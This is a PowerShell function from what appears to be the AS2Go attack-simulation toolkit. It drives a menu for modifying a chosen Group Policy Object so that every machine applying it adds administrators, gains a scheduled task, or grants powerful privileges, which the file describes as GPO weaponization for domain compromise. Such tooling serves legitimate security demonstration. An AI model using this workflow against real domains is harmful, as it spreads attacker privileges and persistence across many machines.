<#
.SYNOPSIS
Manipulates Group Policy Template files for domain-wide compromise.

.DESCRIPTION
Modifies a selected Group Policy Object's templates to distribute malicious configurations
across all domain-joined machines, demonstrating GPO weaponization for lateral movement.

.EXAMPLE
Invoke-GPTManipulation
Runs the Group Policy Template manipulation workflow using the initialized AS2Go module configuration.

.INPUTS
None. This function does not declare pipeline input.

.OUTPUTS
Console messages and output from invoked commands; no dedicated result object is defined.

.NOTES
Private AS2Go function. Run from an initialized AS2Go module session.

.COMPONENT
Category: Main Function

.FUNCTIONALITY
Offers changes to a selected GPO: local group membership, scheduled tasks, or sensitive user rights.
Demonstrates how writable Group Policy Template files can spread privileged settings to computers applying the GPO.
#>
function Invoke-GPTManipulation {

    $info = Measure-FunctionRuntime -Begin

    If (-not $SkipClearHost) { Clear-Host }
    Write-AS2GoOutput -Type Header -M "Manipulate Group Policy Templates (GPT) files"
    Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)

    If ($UnAttended) {
        $answer = $Script:Yes
    }
    else {
        $answer = Show-DecisionPrompt
    }

    If ($answer -ne $Script:Yes) {
        Write-Log -Message "User chose not to proceed with GPT manipulation."
        Measure-FunctionRuntime -End -Details $Info
        return
    }


    #$TargetGPO = Get-GPOLinkedOnDomain
    $TargetGPO = Get-TargetGPO


    if ([string]::IsNullOrEmpty($TargetGPO)) {
        Write-AS2GoOutput -Type CodeSnippet -Message "Domain Selection cancelled by user"

    }
    else {

        $ID = $TargetGPO.ID.Guid
        $name = $TargetGPO.DisplayName
        $domainDNS = $TargetGPO.DomainDNS
        $server = $TargetGPO.Server
        Get-GPOSettings -ID $ID -Name $name -postfix 'before'

        $GPOManipulation = "M"

        Do {
            $repeat = $Script:Yes

            $title = "GPT Manipulation"
            $message = "Select the attack technique to execute."
            
            $Options = @(
                [pscustomobject] @{
                    Label = "Add &Members"
                    Help  = "Add members to the built-in Administrators & Remote Desktop Users Group."
                    Value = "M"
                },
                [pscustomobject] @{
                    Label = "Scheduled &Tasks"
                    Help  = "Add a Scheduled Task."
                    Value = "S"
                },
                [pscustomobject] @{
                    Label = "Add User &Rights Assignment"
                    Help  = "like SeDebugPrivilege,SeTcbPrivilege or SeRemoteInteractiveLogonRight."
                    Value = "U"
                },
                [pscustomobject] @{
                    Label = "&Skip"
                    Help  = "Skip GPT Manipulation."
                    Value = "Skip"
                }
            )
            
            $answer = Show-DecisionPrompt -Message $message -Options $Options -Default 0 -Title $title

            switch ($answer) {

                "M" {
                    Add-GPOMemberToBuiltinGroups -ID $ID -Name $name -domainDNS $domainDNS -server $server
                    Get-GPOSettings -ID $ID -Name $name -postfix 'after'
                    $GPOManipulation = "S"
                }
                "S" {
                    Add-GPOScheduleTask -ID $ID -Name $name -domainDNS $domainDNS -server $server
                    Get-GPOSettings -ID $ID -Name $name -postfix 'after'
                    $GPOManipulation = "U"
                }
                "U" {
                    Add-GPOUserRightAssignments -ID $ID -Name $name -domainDNS $domainDNS -server $server
                    Get-GPOSettings -ID $ID -Name $name -postfix 'after'
                    $GPOManipulation = "M"
                }
                "Skip" {
                    $repeat = $Script:No
                }
                default {
                    Write-Host "out of scope"
                }
            }
        
            If (-not $SkipClearHost) { Clear-Host }
            
            Write-Log -Message "    >>  last technique: $answer"
        
        } Until ($repeat -eq $Script:No)

        #New-GPOManipulation -ID $ID -name $name -domainDNS $domainDNS -server $server
    }
    Measure-FunctionRuntime -End -Details $info
}
